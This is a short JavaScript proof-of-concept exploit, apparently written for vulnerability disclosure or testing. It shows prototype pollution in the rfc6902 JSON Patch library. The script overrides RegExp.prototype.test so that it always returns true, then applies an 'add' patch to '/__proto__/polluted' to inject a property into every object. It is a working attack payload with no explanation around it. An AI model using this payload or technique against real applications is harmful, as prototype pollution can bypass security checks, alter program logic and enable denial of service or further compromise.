RegExp.prototype.test = () => true;
console.log({}.polluted);
var rfc6902 = require('rfc6902');
var obj = {};
rfc6902.applyPatch(obj, [{
        op: 'add',
        path: '/__proto__/polluted',
        value: 'yes'
    }]);
console.log({}.polluted);